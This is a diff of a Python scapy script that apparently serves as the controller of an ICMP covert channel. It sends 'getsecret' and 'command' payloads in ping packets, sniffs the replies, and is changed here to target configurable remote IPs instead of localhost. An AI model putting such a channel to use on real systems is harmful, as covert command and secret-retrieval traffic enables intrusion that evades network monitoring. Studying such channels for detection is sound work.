@@ -7,17 +7,18 @@ from multiprocessing import Process
 from scapy.all import *
 from scapy.layers.inet import ICMP, IP
 
+destIP = ''
+srcIP = ''
+interface = '\\Device\\NPF_Loopback'
 
 def sendSecretPing():
-    ip = 'localhost'
-    packet = IP(dst=ip, src='localhost') / ICMP(type=8) / (b"getsecret")
+    packet = IP(dst=destIP, src=srcIP) / ICMP(type=8) / (b"getsecret")
     send(packet)
 
 
 def sendCommandPing(command):
-    ip = 'localhost'
     data = "command" + command
-    packet = IP(dst=ip, src='localhost') / ICMP(type=8) / (data.encode())
+    packet = IP(dst=destIP, src=srcIP) / ICMP(type=8) / (data.encode())
     send(packet)
 
 
@@ -31,7 +32,7 @@ def processPacket(packet):
 
 
 def startSniff():
-    sniff(iface='\\Device\\NPF_Loopback', prn=processPacket, filter="icmp")
+    sniff(iface=interface, prn=processPacket, filter="icmp")
 
 if __name__ == '__main__':
     p = Process(target=startSniff)
